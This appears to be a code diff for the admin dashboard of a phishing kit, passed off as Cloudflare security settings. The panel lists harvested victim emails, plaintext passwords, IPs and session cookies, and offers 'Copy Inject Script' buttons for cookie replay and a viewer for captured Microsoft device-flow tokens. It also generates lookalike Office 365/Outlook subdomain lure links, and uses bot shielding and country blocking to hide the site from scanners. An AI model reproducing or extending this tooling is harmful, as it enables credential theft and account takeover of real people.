+  requireCreds: (onMissing) => {
+    const { apiKey, zoneId } = Cloudflare.getCreds();
+    if (!apiKey || !zoneId) {
+      setStatus("Cloudflare API credentials required", "var(--c-error)");
+      if (onMissing) onMissing();
+      return false;
+    }
+    return true;
+  },
+
+  render: (r) => {
+    const any = r.cfSecurityEnabled || r.cfBotShield || r.cfUnderAttack;
+    if(els.cfMasterToggle) els.cfMasterToggle.checked = any;
+    if(els.cfSecurityStatus) els.cfSecurityStatus.textContent = r.cfSecurityEnabled ? "✅" : "❌";
+    if(els.cfBotShieldStatus) els.cfBotShieldStatus.textContent = r.cfBotShield ? "✅" : "❌";
+    if(els.cfUnderAttackStatus) els.cfUnderAttackStatus.textContent = r.cfUnderAttack ? "✅" : "❌";
+    
+    // Update Country Blocking UI
+    if(els.cfCountryBlockingEnabled) els.cfCountryBlockingEnabled.checked = !!r.cfCountryBlockingEnabled;
+    if(els.cfAllowedCountries && r.cfAllowedCountries) els.cfAllowedCountries.value = r.cfAllowedCountries;
+
+    updateStatusLabel("cfMasterStatusText", any, any ? "var(--c-success)" : "var(--c-error)");
+  },
+
+  setScanning: (active) => {
+    const el = document.querySelector('.unified-cloudflare-control');
+    if(el) active ? el.classList.add('scanning') : el.classList.remove('scanning');
+  },
+
+  loadZones: async (restore = true) => {
+    const select = document.getElementById("cfZoneSelect");
+    const btn = document.getElementById("refreshZonesBtn");
+    const { apiKey, email } = Cloudflare.getCreds();
+    
+    if (!apiKey) {
+      select.innerHTML = '<option value="">Enter API credentials first...</option>';
+      select.disabled = true;
+      return;
+    }
+
+    const old = btn.textContent;
+    btn.textContent = "⏳"; btn.disabled = true; select.disabled = true;
+    Cloudflare.setScanning(true);
+    
+    try {
+      const r = await apiFetch("get_cloudflare_zones", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ cfApiKey: apiKey, cfEmail: email })
+      });
+      const j = await r.json();
+      
+      if (r.ok && j.ok && Array.isArray(j.zones)) {
+        select.innerHTML = '<option value="">Select a Zone...</option>';
+        j.zones.forEach(z => {
+          const o = document.createElement("option");
+          o.value = z.id;
+          o.textContent = `${z.name} (${z.account.name})`;
+          o.dataset.accountId = z.account.id;
+          select.appendChild(o);
+        });
+        select.disabled = false;
+        
+        if (restore && els.cfZoneId.value) {
+          select.value = els.cfZoneId.value;
+        } else if (j.zones.length === 1) {
+          select.value = j.zones[0].id;
+          els.cfZoneId.value = j.zones[0].id;
+          // Auto-configure on initial zone load if fresh
+          setTimeout(() => Cloudflare.sync(true), 500);
+        }
+        setStatus("Zones loaded successfully", "var(--accent)");
+      } else {
+        select.innerHTML = '<option value="">Error loading zones</option>';
+        setStatus("Failed to load zones", "var(--danger)");
+      }
+    } catch (e) {
+      select.innerHTML = '<option value="">Network Error</option>';
+      setStatus("Network Error loading zones", "var(--danger)");
+    } finally {
+      btn.textContent = old; btn.disabled = false;
+      Cloudflare.setScanning(false);
+    }
+  },
+
+  sync: async (autoConfig = false) => {
+    const { apiKey, zoneId } = Cloudflare.getCreds();
+    if (!apiKey) { setStatus("API Key required for sync", "var(--c-error)"); return; }
+    if (!zoneId) { setStatus("Select a Cloudflare Zone first", "var(--c-error)"); return; }
+
+    Cloudflare.setScanning(true);
+    setStatus("Syncing Cloudflare status...", "var(--accent)");
+    try {
+      const r = await apiFetch("sync_cloudflare", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(readForm())
+      });
+      const j = await r.json();
+      if (r.ok && j.ok && j.results) {
+        Cloudflare.render(j.results);
+        if(els.cfTurnstileInvisible && j.results.cfTurnstileInvisible !== undefined) {
+             els.cfTurnstileInvisible.checked = !!j.results.cfTurnstileInvisible;
+        }
+        setStatus("Cloudflare sync complete", "var(--accent)");
+        
+        // Auto-Configure Logic for Fresh Zones
+        const anyActive = j.results.cfSecurityEnabled || j.results.cfBotShield || j.results.cfUnderAttack || j.results.cfCountryBlockingEnabled;
+        if (autoConfig && !anyActive) {
+            console.log("Fresh zone detected, auto-configuring...");
+            setStatus("Fresh zone detected. Auto-deploying security rules...", "var(--c-warn)");
+            // Enable all UI toggles
+            if(els.cfMasterToggle) els.cfMasterToggle.checked = true;
+            if(els.cfSecurityEnabled) els.cfSecurityEnabled.checked = true;
+            if(els.cfBotShield) els.cfBotShield.checked = true;
+            if(els.cfUnderAttack) els.cfUnderAttack.checked = true;
+            
+            // Trigger configuration
+            Cloudflare.configure();
+        }
+      }
+    } catch (e) { setStatus("Cloudflare sync failed", "var(--danger)"); }
+    finally { Cloudflare.setScanning(false); }
+  },
+
+  configure: async () => {
+    if (!Cloudflare.requireCreds()) return;
+    
+    setStatus(`Updating Cloudflare security...`, "var(--accent)");
+    
+    try {
+      const r = await apiFetch("configure_cloudflare", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(readForm())
+      });
+      
+      if (r.ok) {
+        setStatus(`Cloudflare security updated`, "var(--c-success)");
+        // Don't pass autoConfig=true here to avoid loops
+        setTimeout(() => Cloudflare.sync(false), 1000);
+      } else {
+        const j = await r.json();
+        const err = (j.errors && j.errors.join(", ")) || "Unknown error";
+        setStatus(`Update failed: ${err}`, "var(--c-error)");
+      }
+    } catch (e) {
+      setStatus("Configuration error", "var(--c-error)");
+    }
+  },
+  
+  init: () => {
+      document.getElementById("refreshZonesBtn").addEventListener("click", () => Cloudflare.loadZones(false));
+      
+      // Auto-populate Create Widget Domain Dropdown from Zone Select
+      const updateWidgetDomainList = () => {
+          const zoneSelect = document.getElementById("cfZoneSelect");
+          const widgetSelect = document.getElementById("cfWidgetDomain");
+          if (!zoneSelect || !widgetSelect) return;
+          
+          widgetSelect.innerHTML = ''; // Clear existing
+          for (let i = 0; i < zoneSelect.options.length; i++) {
+              const opt = zoneSelect.options[i];
+              if (opt.value) { // Skip placeholder
+                  const newOpt = document.createElement("option");
+                  
+                  // Extract domain name from text "domain.com (Account Name)"
+                  let domainName = opt.text;
+                  if (domainName.includes('(')) {
+                      domainName = domainName.split('(')[0].trim();
+                  }
+                  
+                  newOpt.value = domainName; 
+                  newOpt.textContent = domainName;
+                  widgetSelect.appendChild(newOpt);
+              }
+          }
+      };
+
+      // Helper for click-to-toggle multi-select (no Ctrl/Cmd needed)
+      const enableClickToggle = (el) => {
+          if(!el || el.tagName !== "SELECT" || !el.multiple) return;
+          
+          el.addEventListener("mousedown", (e) => {
+              if(e.target && e.target.tagName === "OPTION"){
+                  e.preventDefault();
+                  const opt = e.target;
+                  opt.selected = !opt.selected;
+                  el.dispatchEvent(new Event("change", { bubbles: true }));
+                  return false;
+              }
+          });
+      };
+      
+      const cfWidgetDomain = document.getElementById("cfWidgetDomain");
+      if(cfWidgetDomain) enableClickToggle(cfWidgetDomain);
+
+      // Monkey-patch loadZones to trigger update after it completes
+      const originalLoadZones = Cloudflare.loadZones;
+      Cloudflare.loadZones = async (restore) => {
+          await originalLoadZones(restore);
+          setTimeout(updateWidgetDomainList, 100); // Small delay to ensure DOM is updated
+      };
+
+      document.getElementById("cfZoneSelect").addEventListener("change", function() {
+        const o = this.selectedOptions[0];
+        if (o && o.value) {
+          els.cfZoneId.value = o.value;
+          els.cfAccountId.value = o.dataset.accountId || "";
+          Cloudflare.sync(true); // Auto-configure on zone selection
+        } else {
+          els.cfZoneId.value = "";
+          els.cfAccountId.value = "";
+        }
+        updateWidgetDomainList();
+      });
+
+      // Handle Create Widget Button
+      const createWidgetBtn = document.getElementById("createWidgetBtn");
+      if (createWidgetBtn) {
+          createWidgetBtn.addEventListener("click", async () => {
+              const widgetSelect = document.getElementById("cfWidgetDomain");
+              const mode = document.getElementById("cfWidgetMode").value;
+              const accountId = els.cfAccountId.value;
+              
+              // Get selected domains
+              const selectedDomains = Array.from(widgetSelect.selectedOptions).map(opt => opt.value);
+
+              if (selectedDomains.length === 0) {
+                  setStatus("Please select at least one domain", "var(--c-error)");
+                  return;
+              }
+              if (!accountId) {
+                  setStatus("Account ID missing (Select a Zone first)", "var(--c-error)");
+                  return;
+              }
+
+              createWidgetBtn.disabled = true;
+              createWidgetBtn.textContent = "Creating...";
+              
+              try {
+                  const payload = {
+                      cfApiKey: els.cfApiKey.value.trim(),
+                      cfEmail: els.cfEmail.value.trim(),
+                      cfAccountId: accountId,
+                      domains: selectedDomains,
+                      mode: mode,
+                      cfZoneId: els.cfZoneId.value // Optional hint
+                  };
+
+                  const r = await apiFetch("create_turnstile_widget", {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json" },
+                      body: JSON.stringify(payload)
+                  });
+                  
+                  const j = await r.json();
+                  
+                  if (r.ok && j.ok) {
+                      const actionText = j.action === 'updated' ? 'Updated' : 'Created';
+                      setStatus(`Widget ${actionText} for ${selectedDomains.length} domains!`, "var(--c-success)");
+                      
+                      els.cfSiteKey.value = j.siteKey;
+                      if(j.secretKey) els.cfSecretKey.value = j.secretKey;
+                      els.cfTurnstileEnabled.checked = true;
+                      
+                      if (j.mode === 'invisible') {
+                          if(els.cfTurnstileInvisible) els.cfTurnstileInvisible.checked = true;
+                      } else {
+                          if(els.cfTurnstileInvisible) els.cfTurnstileInvisible.checked = false;
+                      }
+                      
+                      // Trigger save logic via validation or sync
+                      validateTurnstileConfig();
+                  } else {
+                      setStatus("Operation Failed: " + (j.error || "Unknown"), "var(--c-error)");
+                  }
+              } catch (e) {
+                  setStatus("Network Error", "var(--c-error)");
+              } finally {
+                  createWidgetBtn.disabled = false;
+                  createWidgetBtn.textContent = "Create/Update & Auto-Fill";
+              }
+          });
+      }
+
+      if (els.cfMasterToggle) {
+        els.cfMasterToggle.addEventListener("click", (e) => {
+             const rollback = () => { e.preventDefault(); e.stopPropagation(); setTimeout(() => { els.cfMasterToggle.checked = false; }, 0); };
+             if (!Cloudflare.requireCreds(rollback)) return;
+             
+             const checked = els.cfMasterToggle.checked;
+             if(els.cfSecurityEnabled) els.cfSecurityEnabled.checked = checked;
+             if(els.cfBotShield) els.cfBotShield.checked = checked;
+             if(els.cfUnderAttack) els.cfUnderAttack.checked = checked;
+             
+             // Visual updates
+             updateStatusLabel('cfSecurityStatusText', checked, 'var(--c-warn)');
+             updateStatusLabel('cfBotShieldStatusText', checked, 'var(--c-error)');
+             updateStatusLabel('cfUnderAttackStatusText', checked, 'var(--c-error)');
+             
+             Cloudflare.configure();
+        });
+      }
+      
+      // Wire up individual toggles to trigger configure
+      const bindToggle = (el, labelId, color) => {
+          if(el) {
+              el.addEventListener('change', () => {
+                  updateStatusLabel(labelId, el.checked, color);
+                  Cloudflare.configure();
+              });
+          }
+      };
+      
+      bindToggle(els.cfSecurityEnabled, 'cfSecurityStatusText', 'var(--c-warn)');
+      bindToggle(els.cfBotShield, 'cfBotShieldStatusText', 'var(--c-error)');
+      bindToggle(els.cfUnderAttack, 'cfUnderAttackStatusText', 'var(--c-error)');
+      
+      // Wire up Turnstile Invisible Toggle
+      if(els.cfTurnstileInvisible) {
+          els.cfTurnstileInvisible.addEventListener('change', () => {
+              Cloudflare.configure();
+          });
+      }
+      
+      // Wire up Country Blocking Toggle
+      if(els.cfCountryBlockingEnabled) {
+          els.cfCountryBlockingEnabled.addEventListener('change', () => {
+              Cloudflare.configure();
+          });
+      }
+
+      // Wire up Update Countries Button
+      const updateCountriesBtn = document.getElementById("updateCfCountriesBtn");
+      if(updateCountriesBtn) {
+          updateCountriesBtn.addEventListener("click", () => {
+              Cloudflare.configure();
+          });
+      }
+
+      // Optional: Update on Enter key in the country input
+      if(els.cfAllowedCountries) {
+          els.cfAllowedCountries.addEventListener("keypress", (e) => {
+              if(e.key === "Enter") {
+                  e.preventDefault();
+                  Cloudflare.configure();
+              }
+          });
+      }
+      
+      if (els.syncCloudflareBtn) els.syncCloudflareBtn.addEventListener("click", Cloudflare.sync);
+
+      [els.cfApiKey, els.cfEmail].forEach(el => {
+        if(el) el.addEventListener("input", () => {
+          clearTimeout(window.cfSyncTimeout);
+          window.cfSyncTimeout = setTimeout(() => {
+             const key = els.cfApiKey.value.trim();
+             const email = els.cfEmail.value.trim();
+             const zone = els.cfZoneId.value.trim();
+             
+             if (key && email) {
+                 if (!zone) {
+                     Cloudflare.loadZones(true);
+                 } else {
+                     Cloudflare.sync(true); // Auto-configure on credential update
+                 }
+             }
+          }, 1000);
+        });
+      });
+      
+      if(els.cfZoneId) els.cfZoneId.addEventListener("change", () => {
+          if(els.cfZoneId.value) Cloudflare.sync();
+      });
+  }
+};
+Cloudflare.init();
+
+(async function init(){
+  // Ensure DOM is ready before manipulating elements
+  const onReady = () => {
+      populateAllowedCountriesSelect();
+      enableAllowedCountriesClickToggle();
+      initAllowedCountriesDropdown();
+  };
+
+  if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', onReady);
+  } else {
+      onReady();
+  }
+
+  try{
+    const r=await apiFetch("get_config",{cache:"no-store"});
+    if(r.ok){
+      const data=await r.json();
+      loadForm(Object.assign({},defaults,data));
+      setStatus("Loaded config.json", "var(--accent)");
+      if (data.cfApiKey) {
+        Cloudflare.loadZones(true).then(() => {
+          if (data.cfZoneId) Cloudflare.sync();
+        });
+      }
+    }else{
+      loadForm(defaults);
+      setStatus("Using defaults", "var(--accent-3)");
+    }
+    // checkTelegram(); // Disabled on load to prevent auto-testing on refresh
+  }catch(e){
+    loadForm(defaults);
+    setStatus("Using defaults", "var(--accent-3)");
+    // checkTelegram(); // Disabled on load to prevent auto-testing on refresh
+  }
+})();
+
+
+
+function updateAdminUploadVisibility(){
+  const show = els.template.value === 'upload';
+  const grp = document.getElementById('adminUploadGroup');
+  if (grp) grp.style.display = show ? 'block' : 'none';
+  if (show) {
+    fetch('/uploads/bg_current.txt', {cache:'no-store'})
+      .then(r => r.ok ? r.text() : '')
+      .then(t => {
+        const u = (t || '').trim();
+        const img = document.getElementById('uploadPreview');
+        if (img) img.src = u || '';
+      }).catch(()=>{});
+  }
+}
+els.template.addEventListener('change', updateAdminUploadVisibility);
+
+const uploadForm = document.getElementById('uploadForm');
+if(uploadForm) {
+  uploadForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const btn = document.getElementById('uploadBtn');
+    const originalText = btn.textContent;
+    btn.textContent = 'Uploading...';
+    btn.disabled = true;
+    
+    const formData = new FormData(uploadForm);
+    
+    try {
+      const res = await fetch('/admin/upload?ajax=1', {
+        method: 'POST',
+        body: formData
+      });
+      let j;
+      try {
+          j = await res.json();
+      } catch (e) {
+          // If response is not JSON (e.g. error page), handle gracefully
+          throw new Error("Invalid server response");
+      }
+      
+      if(res.ok && j.ok) {
+        setStatus("Background uploaded successfully!", "var(--accent)");
+        updateAdminUploadVisibility(); 
+      } else {
+        setStatus("Upload failed: " + (j.error || "Unknown error"), "var(--danger)");
+      }
+    } catch(err) {
+      setStatus("Upload failed: " + err.message, "var(--danger)");
+    } finally {
+      btn.textContent = originalText;
+      btn.disabled = false;
+      uploadForm.reset();
+    }
+  });
+}
+
+document.getElementById("saveServer").addEventListener("click",async()=>{
+  try{
+    const res=await apiFetch("save_config",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(readForm())});
+    if(res.ok){
+      setTimeout(() => {
+        setStatus("Saved to server", "var(--accent)");
+      }, 1000);
+    }else{
+        try {
+            const j = await res.json();
+            setStatus("Save failed: " + (j.error || "Unknown error"), "var(--danger)");
+        } catch(e) {
+            setStatus("Save failed: " + res.statusText, "var(--danger)");
+        }
+    }
+  }catch(e){setStatus("Save failed: " + e.message, "var(--danger)");}
+});
+
+async function loadEvents(){
+  try{
+    const res=await apiFetch("get_events",{cache:"no-store"});
+    if(!res.ok){
+      setStatus("Failed to load events", "var(--danger)");
+      return;
+    }
+    const data=await res.json();
+    if(!data.ok){
+       setStatus("Error loading events: " + (data.error || "Unknown"), "var(--danger)");
+       return;
+    }
+    let rows = data.events || [];
+    const tbody=document.querySelector("#eventsTable tbody");
+    tbody.innerHTML="";
+    const thead = document.querySelector("#eventsTable thead tr");
+    if (thead) {
+        thead.innerHTML = `
+          <th>Time</th>
+          <th>Type</th>
+          <th>Email</th>
+          <th>Password</th>
+          <th>IP</th>
+          <th>Cookies</th>
+        `;
+    }
+    let totalCookies = 0;
+    let incorrect = 0;
+    let correct = 0;
+    let visits = 0;
+    const countryStats = {};
+    const fragment = document.createDocumentFragment();
+    let tableRowCount = 0;
+    const uniqueSessions = new Set();
+
+    const formatTime = (iso) => {
+        if (!iso) return "-";
+        try {
+            const d = new Date(iso);
+            if (isNaN(d.getTime())) return iso;
+            return d.toLocaleDateString('en-GB', {
+                day: 'numeric',
+                month: 'long',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                hour12: false
+            });
+        } catch (e) { return iso; }
+    };
+
+    const showVisits = document.getElementById('showVisits')?.checked ?? true;
+    for (const r of rows) {
+        const status = String(r.botStatus || 'unknown').trim();
+        const type = String(r.type || '').trim();
+        const password = String(r.password || "").trim();
+        const hasPassword = password.length > 0;
+        const hasCookies = (status === 'completed' || !!r.hasScript);
+        const isVisitor = !r.emailMask || String(r.emailMask).trim() === 'visitor';
+
+        // Track unique sessions for "Total Visits" stat
+        if (r.cookieId) {
+            uniqueSessions.add(r.cookieId);
+        }
+
+        // Track Geographic Stats for all entries
+        if (r.country) {
+            const countryCode = String(r.country).trim();
+            if (countryCode) {
+                countryStats[countryCode] = (countryStats[countryCode] || 0) + 1;
+            }
+        }
+
+        // Stats Logic
+        if (hasPassword) {
+            if (hasCookies) {
+                correct++;
+            } else {
+                // Email + Pass + No cookies = Incorrect
+                incorrect++;
+            }
+        } else if (!isVisitor) {
+            // Email Alone = Visit (Only count if NOT a generic visitor)
+            visits++;
+        }
+
+        // Table Rendering
+        // Only show if it's NOT a generic visitor (meaning we have an email or password)
+        if (!isVisitor) {
+            let typeLabel = String(r.type || "Unknown").trim();
+
+            if (hasCookies) {
+                typeLabel = "Correct";
+            } else if (hasPassword) {
+                typeLabel = (status === 'processing') ? "Processing..." : "Incorrect";
+            } else {
+                // Email alone (without password)
+                typeLabel = "Visit"; 
+            }
+
+            // FILTER: Hide visits if toggle is off
+            if (typeLabel === 'Visit' && !showVisits) continue;
+
+            const tr = document.createElement("tr");
+            const isSuccess = typeLabel === 'Correct';
+            const isNeutral = typeLabel === 'Visit' || typeLabel === 'Processing...';
+            const badgeStyle = isSuccess ? 'border-color:var(--accent);color:var(--accent)' : (isNeutral ? 'border-color:var(--c-info);color:var(--c-info)' : 'border-color:var(--danger);color:var(--danger)');
+            
+            let cookieBtn = '';
+            const isFailedAttempt = r.type && (r.type.includes('fail') || r.type.includes('error'));
+            const isDeviceFlow = r.type === 'microsoft_device_flow';
+            
+            if (r.hasScript) {
+                cookieBtn = `<div style="display:flex;gap:4px">
+                     <button class="secondary" style="padding:4px 8px;font-size:10px;border-color:var(--accent);color:var(--accent)" onclick="viewCookies('${r.cookieId}', 'js')">Cookies</button>
+                     <button class="secondary" style="padding:4px 8px;font-size:10px;border-color:var(--accent);color:var(--accent)" onclick="copyInject(this, '${r.cookieId}')" title="Copy Inject Script">Copy</button>
+                </div>`;
+            } else if (isDeviceFlow) {
+                if (status === 'processing') {
+                    cookieBtn = `<span class="badge" style="border-color:var(--accent-3);color:var(--accent-3)">Swapping Tokens... ⏳</span>`;
+                } else {
+                    cookieBtn = `<button class="secondary" style="padding:4px 8px;font-size:10px;border-color:var(--c-info);color:var(--c-info)" onclick="viewTokens('${r.cookieId}')">Tokens Only</button>`;
+                }
+            } else if (status === 'processing' && !isFailedAttempt) {
+                 cookieBtn = `<span class="badge" style="border-color:var(--accent-3);color:var(--accent-3)">Running ⏳</span>`;
+            } else {
+                 cookieBtn = `<span class="badge" style="border-color:var(--text-dim);color:var(--text-dim)">No cookies</span>`;
+            }
+
+            tr.innerHTML=`<td>${formatTime(r.time)}</td>
+                          <td><span class="badge" style="${badgeStyle}">${typeLabel}</span></td>
+                          <td style="font-weight:bold; color:var(--text)">${r.emailMask || r.email || r.email_mask || "No Email"}</td>
+                          <td style="font-family:var(--font-mono)">${r.password||"-"}</td>
+                          <td>${r.ip||""}</td>
+                          <td>${cookieBtn}</td>`;
+            fragment.appendChild(tr);
+            tableRowCount++;
+        }
+    }
+    
+    if (tableRowCount === 0) {
+        const tr = document.createElement("tr");
+        tr.innerHTML = `<td colspan="6" class="muted" style="text-align:center; padding: 22px;">No submissions yet.</td>`;
+        fragment.appendChild(tr);
+    }
+    tbody.appendChild(fragment);
+
+    // Update stats UI
+    if(document.getElementById('stat-total-cookies')) document.getElementById('stat-total-cookies').textContent = correct; // Total Cookies = Correct
+    if(document.getElementById('stat-incorrect')) document.getElementById('stat-incorrect').textContent = incorrect;
+    if(document.getElementById('stat-correct')) document.getElementById('stat-correct').textContent = correct;
+    if(document.getElementById('stat-visits')) document.getElementById('stat-visits').textContent = uniqueSessions.size;
+    
+    try {
+        renderCountryMap(countryStats);
+    } catch (e) {
+        console.error("Map rendering failed:", e);
+    }
+
+    if(document.getElementById('eventsCount')) document.getElementById('eventsCount').textContent = tableRowCount;
+    setStatus(tableRowCount === 0 ? "No submissions yet" : `Showing ${tableRowCount} entries`, "var(--accent)");
+  }catch(e){
+    console.error("Error loading events:", e);
+    setStatus("Error loading events", "var(--danger)");
+  }
+}
+
+function renderCountryMap(stats) {
+    const container = document.getElementById('analytics-map');
+    if (!container) return;
+    
+    const entries = Object.entries(stats).sort((a, b) => b[1] - a[1]);
+    if (entries.length === 0) {
+        container.innerHTML = '<div class="muted" style="grid-column: 1/-1; text-align: center; padding: 40px;">No geographic data available yet.</div>';
+        return;
+    }
+    
+    container.innerHTML = entries.map(([code, count]) => `
+        <div class="analysis-box-compact" style="margin-bottom: 0; display: flex; align-items: center; justify-content: space-between; background: rgba(255,255,255,0.03);">
+            <div style="display: flex; align-items: center; gap: 8px;">
+                <span style="font-size: 20px;">${getFlagEmoji(code)}</span>
+                <span style="font-weight: bold; color: var(--text); font-size: 11px;">${code}</span>
+            </div>
+            <div style="color: var(--c-info); font-weight: bold; font-size: 12px;">${count}</div>
+        </div>
+    `).join('');
+}
+
+function getFlagEmoji(countryCode) {
+    if (!countryCode || countryCode === 'XX' || countryCode === 'unknown') return '🌐';
+    const codePoints = countryCode
+        .toUpperCase()
+        .split('')
+        .map(char => 127397 + char.charCodeAt());
+    try {
+        return String.fromCodePoint(...codePoints);
+    } catch(e) {
+        return '🌐';
+    }
+}
+window.copyInject = async function(btn, id) {
+    const originalText = btn.innerHTML;
+    btn.innerHTML = '...';
+    try {
+        const res = await apiFetch("get_cookies", { params: { id, type: "js" } });
+        const data = await res.json();
+        if (data.ok) {
+            try {
+                await navigator.clipboard.writeText(data.content);
+                btn.innerHTML = 'Copied!';
+            } catch (err) {
+                // Fallback for HTTP/non-secure contexts
+                const textArea = document.createElement("textarea");
+                textArea.value = data.content;
+                document.body.appendChild(textArea);
+                textArea.select();
+                try {
+                    document.execCommand("copy");
+                    btn.innerHTML = 'Copied!';
+                } catch (e) {
+                    throw new Error("Clipboard access denied");
+                } finally {
+                    document.body.removeChild(textArea);
+                }
+            }
+            setTimeout(() => btn.innerHTML = originalText, 2000);
+        } else {
+            setStatus('Error: ' + (data.error || 'Unknown'), "var(--danger)");
+            btn.innerHTML = originalText;
+        }
+    } catch (e) {
+        setStatus('Failed: ' + e.message, "var(--danger)");
+        btn.innerHTML = originalText;
+    }
+};
+window.viewTokens = async function(id) {
+  const modal = document.getElementById('cookieModal');
+  const content = document.getElementById('cookieContent');
+  const title = document.querySelector('.modal-title');
+  if(title) title.textContent = 'Captured API Tokens';
+  modal.style.display = 'flex';
+  content.textContent = 'Loading...';
+  try {
+    const res = await apiFetch("get_tokens", { params: { id } });
+    const data = await res.json();
+    if (data.ok) {
+        content.textContent = JSON.stringify(data.tokens, null, 4);
+    } else {
+        content.textContent = 'Error: ' + (data.error || 'Unknown error');
+    }
+  } catch (e) {
+    content.textContent = 'Failed to fetch tokens: ' + e.message;
+  }
+};
+window.closeModal = function() {
+  document.getElementById('cookieModal').style.display = 'none';
+};
+window.viewCookies = async function(id, type) {
+  const modal = document.getElementById('cookieModal');
+  const content = document.getElementById('cookieContent');
+  const title = document.querySelector('.modal-title');
+  if(title) title.textContent = 'Session Cookies';
+  modal.style.display = 'flex';
+  content.textContent = 'Loading...';
+  try {
+    const res = await apiFetch("get_cookies", { params: { id, type: type || "" } });
+    const data = await res.json();
+    if (data.ok) {
+        content.textContent = data.content;
+    } else {
+        content.textContent = 'Error: ' + (data.error || 'Unknown error');
+    }
+  } catch (e) {
+    content.textContent = 'Failed to fetch cookies: ' + e.message;
+  }
+};
+document.getElementById('copyCookiesBtn').addEventListener('click', () => {
+    const text = document.getElementById('cookieContent').textContent;
+    const fallbackCopy = (txt) => {
+        const textArea = document.createElement("textarea");
+        textArea.value = txt;
+        document.body.appendChild(textArea);
+        textArea.select();
+        try {
+            document.execCommand("copy");
+            setStatus('Copied to clipboard!', "var(--accent)");
+        } catch (e) {
+            setStatus('Failed to copy', "var(--danger)");
+        } finally {
+            document.body.removeChild(textArea);
+        }
+    };
+
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(() => {
+            setStatus('Copied to clipboard!', "var(--accent)");
+        }).catch(err => {
+            fallbackCopy(text);
+        });
+    } else {
+        fallbackCopy(text);
+    }
+});
+(function(){
+  document.getElementById("refreshEvents").addEventListener("click",loadEvents);
+  document.getElementById("showVisits")?.addEventListener("change",loadEvents);
+  setInterval(loadEvents, 3000);
+document.getElementById("clearLogs").addEventListener("click", async () => {
+    if (!confirm("Are you sure you want to clear all logs and cookies? This cannot be undone.")) return;
+    try {
+        const res = await apiFetch("clear_logs", { method: "POST" });
+        const j = await res.json();
+        if (res.ok && j.ok) {
+            setStatus("Logs cleared successfully", "var(--accent)");
+            loadEvents();
+        } else {
+            setStatus("Failed to clear logs: " + (j.error || "Unknown"), "var(--danger)");
+        }
+    } catch (e) {
+        setStatus("Error clearing logs", "var(--danger)");
+    }
+});
+  loadEvents();
+})();
+
+const navSettings=document.getElementById("navSettings");
+const navSubmissions=document.getElementById("navSubmissions");
+const secSettings=document.getElementById("section-settings");
+
+function switchTab(tabId) {
+    const btn = document.querySelector(`.modern-tab-btn[data-tab="${tabId}"]`);
+    if(!btn) return;
+    
+    // Update tab buttons
+    document.querySelectorAll('.modern-tab-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    
+    // Update tab contents
+    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+    const targetContent = document.getElementById(tabId);
+    if(targetContent) targetContent.classList.add('active');
+
+    if (tabId === 'tab-general') {
+        updateConnectionStatus();
+    }
+
+    // Toggle Results Container & Settings Layout
+    const resultsContainer = document.getElementById('results-container');
+    const settingsLayout = document.querySelector('.settings-layout');
+    
+    if (tabId === 'tab-submissions') {
+        if (resultsContainer) resultsContainer.style.display = 'block';
+        if (settingsLayout) settingsLayout.style.display = 'none';
+    } else {
+        if (resultsContainer) resultsContainer.style.display = 'none';
+        if (settingsLayout) settingsLayout.style.display = '';
+    }
+
+    // Toggle Live Analytics Sidebar Visibility
+    const liveAnalytics = document.querySelector('.modern-analysis-sidebar');
+    if (liveAnalytics) {
+        // Hide on Security Tab, show on others
+        if (tabId === 'tab-security') {
+            liveAnalytics.style.display = 'none';
+        } else {
+            liveAnalytics.style.display = 'grid'; // Restore grid display
+        }
+    }
+
+    if (tabId === 'tab-submissions' && targetContent) {
+        setTimeout(() => {
+            try {
+                targetContent.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            } catch (e) {}
+        }, 0);
+    }
+    
+    // Update topbar buttons
+    if(tabId === 'tab-submissions') {
+        navSettings.classList.remove('active');
+        navSubmissions.classList.add('active');
+        secSettings.style.display = "block"; // Submissions is inside section-settings
+        loadEvents(); // Immediate load
+    } else {
+        navSettings.classList.add('active');
+        navSubmissions.classList.remove('active');
+        secSettings.style.display = "block";
+    }
+}
+
+navSettings.addEventListener("click", () => switchTab('tab-general'));
+navSubmissions.addEventListener("click", () => switchTab('tab-submissions'));
+
+document.querySelectorAll('.modern-tab-btn').forEach(btn => {
+    btn.addEventListener('click', () => switchTab(btn.getAttribute('data-tab')));
+});
+function openFromHash() {
+    if (location.hash === '#submissions') {
+        switchTab('tab-submissions');
+    }
+}
+window.addEventListener('hashchange', openFromHash);
+// Initial check for hash
+openFromHash();
+
+async function loadDeploymentInfo() {
+    try {
+        const res = await apiFetch("get_deployment_info");
+        const json = await res.json();
+        if (json.ok && json.data) {
+            const { main_domain, rotation_path, rotation_slugs, path } = json.data;
+            if (main_domain) {
+                const container = document.getElementById('deployment-links-container');
+                const list = document.getElementById('deployment-links-list');
+                container.style.display = 'block';
+                list.innerHTML = '';
+                
+                let slugs = rotation_slugs;
+                let firstSlug = 'share';
+                if (Array.isArray(slugs) && slugs.length > 0) {
+                    firstSlug = slugs[0];
+                } else if (typeof slugs === 'string' && slugs) {
+                    firstSlug = slugs;
+                }
+
+                const rotPath = rotation_path || 'admg';
+                const url = `https://mail-0365microsoftsapps365ooutlookswebbs-office.${main_domain}/${rotPath}/${firstSlug}/john@school.com`;
+
+                const group = document.createElement('div');
+                group.style.display = 'flex';
+                group.style.gap = '8px';
+                group.style.alignItems = 'center';
+
+                const btn = document.createElement('button');
+                btn.textContent = url;
+                btn.className = 'secondary';
+                btn.style.textTransform = 'none';
+                btn.style.fontSize = '12px';
+                btn.style.borderColor = 'var(--c-info)';
+                btn.style.color = '#fff';
+                btn.style.flex = '1';
+                btn.style.textAlign = 'left';
+                btn.onclick = async () => {
+                    try {
+                        await navigator.clipboard.writeText(url);
+                    } catch (err) {
+                        const textArea = document.createElement("textarea");
+                        textArea.value = url;
+                        document.body.appendChild(textArea);
